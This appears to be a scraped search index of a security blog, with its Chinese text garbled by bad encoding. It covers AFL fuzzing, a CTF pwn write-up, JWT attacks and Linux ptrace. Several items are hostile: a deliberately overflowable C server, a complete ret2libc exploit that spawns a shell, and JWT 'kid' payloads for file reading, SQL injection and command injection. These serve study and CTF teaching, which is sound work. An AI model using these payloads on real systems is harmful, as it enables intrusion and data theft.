#include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); while(1){ cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\";","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:4","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"å››ã€æ€»ç»“ ä»¥ä¸Šä¸ºAFLçš„åŸºæœ¬çŸ¥è¯†å’ŒåŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼Œä»ç„¶å±äºæ¯”è¾ƒåŸºå±‚çš„å†…å®¹ï¼Œåç»­å°†è¿›è¡Œæºç åˆ†æå’Œæ›´å¤šçš„å®ä¾‹è®­ç»ƒçš„ç›¸å…³å†…å®¹ã€‚ ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:4:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["CTF"],"content":"SSCTF2019 PWNé¢˜é¢˜è§£","date":"2020-11-25","objectID":"/2020/11/roarctf/","tags":["pwn"],"title":"SSCTF2019 PWNé¢˜é¢˜è§£","uri":"/2020/11/roarctf/"},{"categories":["CTF"],"content":"SSCTF2019 PWNé¢˜é¢˜è§£ ","date":"2020-11-25","objectID":"/2020/11/roarctf/:0:0","tags":["pwn"],"title":"SSCTF2019 PWNé¢˜é¢˜è§£","uri":"/2020/11/roarctf/"},{"categories":["CTF"],"content":"stackpwn é¦–å…ˆfile,checsecèµ°ä¸€éï¼Œ64ä½ç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ï¼Œå¼€äº†NX IDAç›´æ¥çœ‹ï¼Œmainå‡½æ•°ï¼š è¿›å…¥vulnçœ‹ä¸€ä¸‹ï¼š å®¹æ˜“çœ‹å‡ºï¼Œå­˜åœ¨æº¢å‡ºç‚¹ï¼Œä¸”v1åˆ°è¿”å›åœ°å€çš„è·ç¦»ä¸º(0x10 + 0x8 = 0x18)ã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬å¤§è‡´æ˜ç™½äº†ç¨‹åºçš„æµç¨‹ï¼šé€šè¿‡vulnå‡½æ•°è¿›è¡Œæ ˆæº¢å‡ºï¼Œä½†æ˜¯ç¨‹åºæ²¡æœ‰ç»™å‡ºsystemå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è¿›è¡Œä¸¤æ¬¡åˆ©ç”¨ï¼Œç¬¬ä¸€æ¬¡åˆ©ç”¨è¿›è¡Œåœ°å€æ³„æ¼ï¼Œéœ€è¦ä½¿ç”¨ROPï¼Œç¬¬äºŒæ¬¡çœŸå®è¿›è¡Œæ”»å‡»ã€‚ åŸºæœ¬æ€è·¯æ˜¯é¦–å…ˆæ³„æ¼å‡ºputså‡½æ•°çš„å®é™…åœ°å€ï¼ˆå› ä¸ºåœ¨mainå‡½æ•°å’Œæº¢å‡ºä¹‹å‰éƒ½ä½¿ç”¨è¿‡äº†ï¼Œæ‰€ä»¥ç¨‹åºå†…å­˜ä¸­å­˜åœ¨putså‡½æ•°çš„çœŸå®åœ°å€.ä½¿ç”¨pop rdi;retå°†gotè¡¨ä¸­çš„å­˜æ”¾çš„putså‡½æ•°çš„çœŸå®åœ°å€åˆ©ç”¨pltè¡¨ä¸­çš„putså‡½æ•°æ‰“å°å‡ºæ¥ï¼Œæˆ‘æ³„æ¼æˆ‘è‡ªå·±ï¼‰ï¼Œç„¶åæ³„æ¼libcçš„åŸºåœ°å€ï¼Œç„¶åè·å–systemå‡½æ•°çš„å®é™…åœ°å€ï¼ˆlibcåŸºåœ°å€+systemåç§»åœ°å€ï¼‰ï¼›ç¨‹åºä¸­æœ‰/bin/shå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç›´æ¥ç”¨å°±å¯ä»¥äº†ã€‚ ","date":"2020-11-25","objectID":"/2020/11/roarctf/:1:0","tags":["pwn"],"title":"SSCTF2019 PWNé¢˜é¢˜è§£","uri":"/2020/11/roarctf/"},{"categories":["CTF"],"content":"Expï¼š from pwn import * context.log_level = 'debug' p = process('./stackpwn') offset = 0x18 #0x10+0x8 pop_rdi_ret = 0x0000000000400933 #ROPgadet : rdi bin_sh = 0x0000000000400954 # address of /bin/sh elf = ELF(\"./stackpwn\") libc = elf.libc # leak libc payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address p.recvuntil(\"instructions...\\n\") p.sendline(payload) #get puts address puts_addr = u64(p.recv(6).ljust(8,'\\x00')) #get libc address puts_base = libc.symbols['puts'] libc_base = puts_addr - puts_base #get system address sys_addr = libc_base + libc.symbols['system'] #second loop payload2 = 'A'*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr) p.sendline(payload2) p.interactive() ","date":"2020-11-25","objectID":"/2020/11/roarctf/:1:1","tags":["pwn"],"title":"SSCTF2019 PWNé¢˜é¢˜è§£","uri":"/2020/11/roarctf/"},{"categories":["Misc"],"content":"JWTè®¤è¯å’Œæ”»å‡»ç•Œé¢ç®€å•æ€»ç»“","date":"2020-11-03","objectID":"/2020/11/jwt/","tags":["JWT"],"title":"JWTè®¤è¯å’Œæ”»å‡»ç•Œé¢ç®€å•æ€»ç»“","uri":"/2020/11/jwt/"},{"categories":["Misc"],"content":"JWTè®¤è¯å’Œæ”»å‡»ç•Œé¢ç®€å•æ€»ç»“ ","date":"2020-11-03","objectID":"/2020/11/jwt/:0:0","tags":["JWT"],"title":"JWTè®¤è¯å’Œæ”»å‡»ç•Œé¢ç®€å•æ€»ç»“","uri":"/2020/11/jwt/"},{"categories":["Misc"],"content":"JWTç®€è¿° Json web token (JWT), æ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†ï¼ˆ(RFC 7519).è¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ã€‚JWTçš„å£°æ˜ä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºä»èµ„æºæœåŠ¡å™¨è·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢åŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜ä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æ¥è¢«ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯è¢«åŠ å¯†ã€‚ ","date":"2020-11-03","objectID":"/2020/11/jwt/:1:0","tags":["JWT"],"title":"JWTè®¤è¯å’Œæ”»å‡»ç•Œé¢ç®€å•æ€»ç»“","uri":"/2020/11/jwt/"},{"categories":["Misc"],"content":"JWTè®¤è¯å’Œsessionè®¤è¯çš„åŒºåˆ« 1. sessionè®¤è¯ httpåè®®æ˜¯ä¸€ç§æ— çŠ¶æ€çš„åè®®ï¼Œå³å…¶å¯¹äº‹åŠ¡å¤„ç†æ²¡æœ‰è®°å¿†èƒ½åŠ›ï¼Œä¸å¯¹è¯·æ±‚å’Œå“åº”ä¹‹é—´çš„é€šä¿¡çŠ¶æ€è¿›è¡Œä¿å­˜ã€‚å¦‚æœç”¨æˆ·å‘åº”ç”¨æä¾›äº†ç”¨æˆ·åå’Œå¯†ç æ¥è¿›è¡Œç”¨æˆ·è®¤è¯ï¼Œé‚£ä¹ˆåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œéœ€è¦å†æ¬¡è¿›è¡Œç”¨æˆ·è®¤è¯ã€‚å› ä¸ºä½¿ç”¨httpåè®®å¹¶ä¸èƒ½æ˜ç¡®æ˜¯å“ªä¸ªç”¨æˆ·å‘é€çš„è¯·æ±‚ã€‚ ä¸ºäº†å®ç°åº”ç”¨å¯ä»¥è¯†åˆ«å‡ºå‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ï¼Œéœ€è¦åœ¨serverä¸Šå­˜å‚¨ä¸€ä»½ç”¨æˆ·ç™»å½•çš„ä¿¡æ¯ï¼Œè¿™ä»½ç™»å½•ä¿¡æ¯ä¼šåœ¨serverå“åº”æ—¶ä¼ é€’ç»™clientï¼Œå‘Šè¯‰å…¶ä¿å­˜ä¸ºcookieï¼Œä»¥ä¾¿ä¸‹æ¬¡è¯·æ±‚æ—¶å‘é€ç»™åº”ç”¨ã€‚è¿™æ ·ï¼Œå°±å¯ä»¥è¯†åˆ«å‡ºå‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚ä»¥ä¸Šå³ä¸ºä¼ ç»Ÿçš„åŸºäºsessionçš„è®¤è¯ã€‚ Cookieçš„ä¼ é€’è¿‡ç¨‹ æµè§ˆå™¨å‘URLå‘é€è¯·æ±‚ serverç”Ÿæˆresponse åœ¨å“åº”å¤´ä¸­åŠ å…¥Set-Cookieå­—æ®µï¼Œå€¼ä¸ºè¦è®¾ç½®çš„Cookie æµè§ˆå™¨æ¥å—åˆ°response æµè§ˆå™¨åœ¨å“åº”å¤´ä¸­æœç´¢Set-Cookieå­—æ®µï¼Œå¹¶å°†å€¼ä¿å­˜åœ¨å†…å­˜æˆ–ç¡¬ç›˜ä¸­ å½“ä¸‹ä¸€æ¬¡å‘è¯¥serverå‘é€httpè¯·æ±‚æ—¶ï¼Œå°†serverè®¾ç½®çš„Cookieé™„åŠ åœ¨httpè¯·æ±‚çš„å­—æ®µCookieä¸­ serveræ”¶åˆ°è¯·æ±‚ï¼Œå‘ç°å¤´éƒ¨æœ‰Cookieå­—æ®µï¼Œåˆ™æ˜ç¡®å·²å¤„ç†è¿‡è¯¥ç”¨æˆ·çš„è¯·æ±‚ è¿‡æœŸçš„Cookieä¼šè¢«åˆ é™¤ åŸºäºCookieâ€”Sessionçš„éªŒè¯è¿‡ç¨‹ ç”¨æˆ·è¾“å…¥ç™»å½•ä¿¡æ¯ serveréªŒè¯ä¿¡æ¯æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®å°±ä¸ºè¯¥ç”¨æˆ·åˆ›å»ºä¸€ä¸ªSessionï¼Œå¹¶æŠŠSessionå­˜å…¥æ•°æ®åº“ serverå‘clientè¿”å›å¸¦æœ‰sessionIDçš„Cookie clientæ¥æ”¶åˆ°serverè¿”å›çš„å“åº”ï¼Œå‘ç°å¤´éƒ¨æœ‰Set-Cookieå­—æ®µï¼Œå°†Cookieè¿›è¡Œä¿å­˜ åç»­clientçš„è¯·æ±‚éƒ½ä¼šé™„å¸¦è¯¥Cookieï¼Œserverå°†sessionIDä¸æ•°æ®åº“ä¸­çš„åšåŒ¹é…ï¼Œå¦‚æœä¸€ç›´åˆ™å¤„ç†è¯¥è¯·æ±‚ ç”¨æˆ·ç™»å‡ºï¼ŒSessionä¼šåœ¨clientå’Œserveréƒ½è¢«é”€æ¯ Cookie-Sessionæœºåˆ¶çš„ç¼ºé™· è·¨åŸŸé—®é¢˜ï¼ŒCookieå±äºåŒæºç­–ç•¥é™åˆ¶çš„å†…å®¹ä¹‹ä¸€ Sessionä¿å­˜åœ¨serverï¼Œå®¹æ˜“é­å—DoSæ”»å‡» æ‰©å±•æ€§ä½ï¼Œå¤šå°serverè¾ƒéš¾å®ç°Sessionå…±äº« å®‰å…¨æ€§ä½ï¼Œattackerå¯ä»¥åˆ©ç”¨æœ¬åœ°Cookieè¿›è¡Œæ¬ºéª—å’ŒCSRFæ”»å‡» 2. JWTè®¤è¯ åŸºäºTokençš„é‰´æƒæœºåˆ¶ä¹Ÿæ˜¯æ— çŠ¶æ€çš„ï¼Œä½†å®ƒä¸å¾å¥¥serverå­˜å‚¨ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯æˆ–ä¼šè¯ä¿¡æ¯ã€‚ JWTç»„æˆ JWTç”±3éƒ¨åˆ†ç»„æˆï¼šheaderã€payloadã€signatureï¼Œæ¯ä¸ªéƒ¨åˆ†ä¸­é—´ä½¿ç”¨.è¿›è¡Œåˆ†éš”ï¼Œå…¶ä¸­ï¼Œheaderå’Œpayloadä½¿ç”¨Base64URLè¿›è¡Œç¼–ç ï¼Œå³ï¼š base64UrlEncode(header).base64UrlEncode(payload).signature headeréƒ¨åˆ†æ˜¯ä¸€ä¸ªJSONå¯¹è±¡ï¼Œç”¨æ¥æè¿°JWTçš„å…ƒæ•°æ®ï¼š { \"typ\": \"JWT\", // è¡¨ç¤ºå¯¹è±¡æ˜¯ä¸€ä¸ª JWT \"alg\": \"HS256\" // è¡¨ç¤ºä½¿ç”¨å“ªç§ Hash ç®—æ³•æ¥åˆ›å»ºç­¾åï¼Œè¿™é‡Œæ˜¯ HMAC-SHA256 } payloadéƒ¨åˆ†ä¹Ÿæ˜¯ä¸€ä¸ªJSONå¯¹è±¡ï¼Œå­˜å‚¨å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®ï¼Œå…¶å†…å®¹å¯ä»¥æ˜¯å®˜æ–¹å®šä¹‰çš„7ä¸ªå­—æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå®šä¹‰çš„ç§æœ‰å­—æ®µï¼š { \"sub\": \"title\", \"iat\": 1605688497, \"exp\": 9999999999, \"name\": \"V4ler1an\" } JWTé»˜è®¤ä¸è¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥è¯¥éƒ¨åˆ†ä¸è¦å­˜æ”¾å…³é”®ä¿¡æ¯ã€‚ signatureæ˜¯å¯¹å‰2éƒ¨åˆ†çš„ç­¾åï¼Œé˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹ã€‚è¿™é‡Œéœ€è¦ä¼ å…¥ä¸€ä¸ªkeyä½œä¸ºåŠ å¯†çš„ç§é’¥ï¼š key = \"secret\" data = base64urlEncode(header) + \".\" + base64urlEncode(payload); signature = HMAC-SHA256(keyï¼Œdata); ä¸€ä¸ªæ ·ä¾‹JWTå¦‚ä¸‹ï¼š JWTè®¤è¯æµç¨‹ ç”¨æˆ·ä½¿ç”¨è´¦å·å’Œå¯†ç å‘å‡ºpostè¯·æ±‚ serverä½¿ç”¨ç§é’¥åˆ›å»ºä¸€ä¸ªJWTï¼Œå¹¶è¿”å›ç»™æµè§ˆå™¨ æµè§ˆå™¨å°†è¯¥JWTä¸²æ”¾åœ¨è¯·æ±‚å¤´çš„Authorizationä¸­: Authorization: Bearer \u003ctoken\u003e, å‘é€ç»™server serverå¯¹JWTè¿›è¡ŒéªŒè¯ éªŒè¯é€šè¿‡åè¿”å›ç›¸åº”çš„èµ„æºç»™æµè§ˆå™¨ ç”¨æˆ·ç™»å‡ºï¼Œclientåˆ é™¤tokenï¼Œserverä¸åšå¤„ç† JWTç¼ºé™· é»˜è®¤ä¸åŠ å¯† åªéªŒè¯æ¥æºå¯é æ€§ï¼Œå¹¶ä¸å¯¹æ•°æ®è¿›è¡Œä¿æŠ¤ï¼Œä¹Ÿä¸ä¼šé˜²æ­¢æœªæˆæƒè®¿é—®ã€‚åªè¦è·å–åˆ°tokenï¼Œä»»æ„ç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡éªŒè¯ã€‚ä¸ºå‡å°‘ç›—ç”¨ï¼ŒJWTçš„æœ‰æ•ˆæœŸåº”è¯¥è®¾ç½®å°½å¯èƒ½çŸ­ Tokenè¿‡æœŸé—®é¢˜ï¼Œå› ä¸ºserverä¸ä¿å­˜SessionçŠ¶æ€ï¼Œæ‰€ä»¥æ— æ³•åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­åºŸæ­¢æˆ–æ›´æ”¹æƒé™ã€‚å³JWTä¸€æ—¦ç­¾å‘ï¼Œåˆ°æœŸå‰ä¼šå§‹ç»ˆæœ‰æ•ˆã€‚ JWTæ”»å‡»ç•Œé¢ çˆ†ç ´ç§é’¥keyã€‚å¦‚æœsignatureçš„åŠ å¯†ç§é’¥keyä¸ºå·²çŸ¥ï¼Œç†è®ºä¸Šæ¥è¯´å¯ä»¥é€šè¿‡çˆ†ç ´è·å¾—ï¼Œä¸”å·²æœ‰çˆ†ç ´å·¥å…·å¯ä»¥ç›´æ¥ä½¿ç”¨ ä¿®æ”¹ç®—æ³•ï¼Œ å°†éå¯¹ç§°åŠ å¯†ç®—æ³•ä¿®æ”¹ä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚HS256ä½¿ç”¨ç§å¯†å¯†é’¥å¯¹æ¯æ¡æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯ï¼Œè¿™ä¹Ÿæ˜¯JWTé»˜è®¤ä½¿ç”¨çš„ç®—æ³•ï¼ŒRS256ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡ŒéªŒè¯ã€‚å¯ä»¥å°†ç®—æ³•RS256æ›´æ”¹ä¸ºHS256ï¼Œåç«¯ä»£ç ä¼šä½¿ç”¨å…¬é’¥ä½œä¸ºç§å¯†å¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256éªŒè¯ç­¾åã€‚å³æƒ³åŠæ³•è·å–åˆ°RS256çš„å…¬é’¥ï¼Œç„¶åä¿®æ”¹ç®—æ³•ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®ç­¾åï¼Œåç«¯ä»£ç ä½¿ç”¨RSAå…¬é’¥+HS256ç®—æ³•ç­¾åï¼Œä»è€Œå®ç°ç»•è¿‡ã€‚ ä¿®æ”¹ç®—æ³•ä¸ºnoneï¼Œå³å°†headerä¸­çš„algå­—æ®µä¿®æ”¹ä¸ºnoneã€‚è¿™ç§æ–¹å¼åªé€‚åˆä¸€äº›ä½ç‰ˆæœ¬çš„JWTåº“ã€‚å½“è®¾ç½®ä¸ºnoneæ—¶è¡¨ç¤ºæ²¡æœ‰ç­¾åç®—æ³•ï¼Œåç«¯ä¸ä¼šè¿›è¡Œç­¾åæ ¡éªŒï¼Œæ­¤æ—¶å»æ‰JWTçš„signatureæ•°æ®ï¼Œç„¶åç›´æ¥æäº¤ç»™æœåŠ¡ç«¯å³å¯ã€‚ ä¿®æ”¹KIDå‚æ•°ã€‚kidæ˜¯headerä¸­çš„ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå…¨ç§°key IDï¼Œç”¨äºæŒ‡å®šåŠ å¯†ç®—æ³•çš„å¯†é’¥ï¼š { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/home/jwt/.ssh/pem\" } è¯¥å‚æ•°å¯ä»¥ç”±ç”¨æˆ·è¾“å…¥ã€‚å¸¸è§çš„æœ‰ä»¥ä¸‹å‡ ç§æ”»å‡»æ–¹å¼ï¼š ä»»æ„æ–‡ä»¶è¯»å– kidå‚æ•°ç”¨äºè¯»å–å¯†é’¥æ–‡ä»¶ï¼Œä½†ç³»ç»Ÿå¹¶ä¸çŸ¥é“ç”¨æˆ·æƒ³è¦è¯»å–çš„æ˜¯å¦æ˜¯å¯†é’¥æ–‡ä»¶ã€‚æ‰€ä»¥ï¼Œå¦‚æœæ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆæ”»å‡»æŠ˜å¯ä»¥è¯»å–åˆ°ç³»ç»Ÿçš„ä»»æ„æ–‡ä»¶ã€‚ { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } SQLæ³¨å…¥ kidä¹Ÿå¯ä»¥ä»æ•°æ®åº“ä¸­æå–æ•°æ®ï¼Œæ­¤æ—¶æœ‰å¯èƒ½é€ æˆSQLæ”»å‡»ï¼Œé€šè¿‡æ„é€ SQLè¯­å¥æ¥è·å–æ•°æ®æˆ–ç»•è¿‡signatureçš„éªŒè¯ã€‚ { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"key111111' || union select 'secretkey' -- \" } å‘½ä»¤æ³¨å…¥ åˆ©ç”¨æ¡ä»¶è‹›åˆ»ã€‚rubyè¯­è¨€éœ€è¦ä½¿ç”¨openå‡½æ•°è¯»å–å¯†é’¥æ–‡ä»¶ï¼Œå¯ä»¥å‘½ä»¤æ³¨å…¥ã€‚ \"/path/to/key_file|whoami\" å¦‚æœæ˜¯phpè¯­è¨€ï¼Œåˆ™éœ€è¦ä½¿ç”¨execæˆ–systemå‡½æ•°è¯»å–å¯†é’¥æ–‡ä»¶ï¼Œå¯èƒ½æ€§è¾ƒå°ã€‚ ä¿¡æ¯æ³„éœ²ã€‚ç”±äºJWTçš„åˆè¡·å¹¶ä¸æ˜¯ä¿è¯ä¼ è¾“æ•°æ®çš„æœºå¯†æ€§ï¼Œæ‰€ä»¥payloadæ˜¯ç›´æ¥ä½¿ç”¨base64urlç¼–ç çš„ã€‚å¦‚æœåœ¨payloadä¸­æºå¸¦äº†æ•æ„Ÿä¿¡æ¯ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œbase64urlè§£ç ï¼Œä»è€Œè¯»å–åˆ°payloadä¸­çš„å…³é”®ä¿¡æ¯ã€‚ ","date":"2020-11-03","objectID":"/2020/11/jwt/:1:1","tags":["JWT"],"title":"JWTè®¤è¯å’Œæ”»å‡»ç•Œé¢ç®€å•æ€»ç»“","uri":"/2020/11/jwt/"},{"categories":["LINUX"],"content":"Linux ptrace è¯¦è§£","date":"2020-10-27","objectID":"/2020/10/ptrace/","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"Linux ptrace è¯¦è§£ å¤‡æ³¨ï¼šæ–‡ç« ä¸­ä½¿ç”¨çš„Linuxå†…æ ¸æºç ç‰ˆæœ¬ä¸ºLinux 5.9ï¼Œä½¿ç”¨çš„Linuxç‰ˆæœ¬ä¸ºLinux ubuntu 5.4.0-65-generic ","date":"2020-10-27","objectID":"/2020/10/ptrace/:0:0","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"ä¸€ã€ç®€è¿° ptraceç³»ç»Ÿè°ƒç”¨æä¾›äº†ä¸€ä¸ªè¿›ç¨‹(tracer)å¯ä»¥æ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹(tracee)è¿è¡Œçš„æ–¹æ³•ï¼Œå¹¶ä¸”tracerå¯ä»¥ç›‘æ§å’Œä¿®æ”¹traceeçš„å†…å­˜å’Œå¯„å­˜å™¨ï¼Œä¸»è¦ç”¨ä½œå®ç°æ–­ç‚¹è°ƒè¯•å’Œç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªã€‚ traceeé¦–å…ˆè¦è¢«attachåˆ°tracerä¸Šï¼Œè¿™é‡Œçš„attachä»¥çº¿ç¨‹ä¸ºå¯¹è±¡ï¼Œåœ¨å¤šçº¿ç¨‹åœºæ™¯ï¼ˆè¿™é‡Œçš„å¤šçº¿ç¨‹åœºæ™¯æŒ‡çš„ä½¿ç”¨clone CLONE_THREAD flagåˆ›å»ºçš„çº¿ç¨‹ç»„ï¼‰ä¸‹ï¼Œæ¯ä¸ªçº¿ç¨‹å¯ä»¥åˆ†åˆ«è¢«attachåˆ°tracerä¸Šã€‚ptraceçš„å‘½ä»¤æ€»æ˜¯ä»¥ä¸‹é¢çš„è°ƒç”¨æ ¼å¼å‘é€åˆ°æŒ‡å®šçš„traceeä¸Šï¼š ptrace(PTRACE_foom, pid, ...) // pidä¸ºlinuxä¸­å¯¹åº”çš„çº¿ç¨‹ID ä¸€ä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡è°ƒç”¨fork()å‡½æ•°æ¥åˆå§‹åŒ–ä¸€ä¸ªè·Ÿè¸ªï¼Œå¹¶è®©ç”Ÿæˆçš„å­è¿›ç¨‹æ‰§è¡ŒPTRACE_TRACEMEï¼Œç„¶åæ‰§è¡Œexecve(ä¸€èˆ¬æƒ…å†µä¸‹)æ¥å¯åŠ¨è·Ÿè¸ªã€‚è¿›ç¨‹ä¹Ÿå¯ä»¥ä½¿ç”¨PTRACE_ATTACHæˆ–PTRACE_SEIZEè¿›è¡Œè·Ÿè¸ªã€‚ å½“å¤„äºè¢«è·Ÿè¸ªçŠ¶æ€æ—¶ï¼Œtraceeæ¯æ”¶åˆ°ä¸€ä¸ªä¿¡å·å°±ä¼šstopï¼Œå³ä½¿æ˜¯æŸäº›æ—¶å€™ä¿¡å·æ˜¯è¢«å¿½ç•¥çš„ã€‚tracerå°†åœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨waitpidæˆ–ä¸waitç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ä¹‹ä¸€ï¼‰æ—¶æ”¶åˆ°é€šçŸ¥ã€‚è¯¥è°ƒç”¨ä¼šè¿”å›ä¸€ä¸ªçŠ¶æ€å€¼ï¼ŒåŒ…å«traceeåœæ­¢çš„åŸå› ã€‚traceeå‘ç”Ÿstopæ—¶ï¼Œtracerå¯ä»¥ä½¿ç”¨å„ç§ptraceçš„requestæ¥æ£€æŸ¥å’Œä¿®æ”¹traceeã€‚ç„¶åï¼Œtracerä½¿traceeç»§ç»­è¿è¡Œï¼Œé€‰æ‹©æ€§åœ°å¿½ç•¥æ‰€ä¼ é€’çš„ä¿¡å·ï¼ˆç”šè‡³ä¼ é€’ä¸€ä¸ªä¸åŸæ¥ä¸åŒçš„ä¿¡å·ï¼‰ã€‚ å½“tracerç»“æŸè·Ÿè¸ªåï¼Œå‘é€PTRACE_DETACHä¿¡å·é‡Šæ”¾traceeï¼Œtraceeå¯ä»¥åœ¨å¸¸è§„çŠ¶æ€ä¸‹ç»§ç»­è¿è¡Œã€‚ ","date":"2020-10-27","objectID":"/2020/10/ptrace/:1:0","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"äºŒã€å‡½æ•°åŸå‹åŠåˆæ­¥ä½¿ç”¨ ","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:0","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"1. å‡½æ•°åŸå‹ ptraceçš„åŸå‹å¦‚ä¸‹ï¼š long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); å…¶ä¸­requestå‚æ•°è¡¨æ˜æ‰§è¡Œçš„è¡Œä¸ºï¼ˆåç»­å°†é‡ç‚¹ä»‹ç»ï¼‰ï¼Œ pidå‚æ•°æ ‡è¯†ç›®æ ‡è¿›ç¨‹ï¼Œaddrå‚æ•°è¡¨æ˜æ‰§è¡Œpeekå’Œpokeæ“ä½œçš„åœ°å€ï¼Œdataå‚æ•°åˆ™å¯¹äºpokeæ“ä½œï¼ŒæŒ‡æ˜å­˜æ”¾æ•°æ®çš„åœ°å€ï¼Œå¯¹äºpeekæ“ä½œï¼ŒæŒ‡æ˜è·å–æ•°æ®çš„åœ°å€ã€‚ è¿”å›å€¼ï¼ŒæˆåŠŸæ‰§è¡Œæ—¶ï¼ŒPTRACE_PEEKè¯·æ±‚è¿”å›æ‰€è¯·æ±‚çš„æ•°æ®ï¼Œå…¶ä»–æƒ…å†µæ—¶è¿”å›0ï¼Œå¤±è´¥åˆ™è¿”å›-1ã€‚errnoè¢«è®¾ç½®ä¸º ","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:1","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. å‡½æ•°å®šä¹‰ ptraceçš„å†…æ ¸å®ç°åœ¨kernel/ptrace.cæ–‡ä»¶ä¸­ï¼Œå†…æ ¸æ¥å£æ˜¯SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)ï¼Œä»ä¸­å¯ä»¥çœ‹åˆ°æ•´ä¸ªä»£ç é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå…¶ä¸­å¯¹PTRACE_TRACEMEå’ŒPTRACE_ATTACH æ˜¯åšç‰¹æ®Šå¤„ç†çš„ã€‚å…¶ä»–çš„æ˜¯ä¸æ¶æ„ç›¸å…³çš„ã€‚ SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data) { struct task_struct 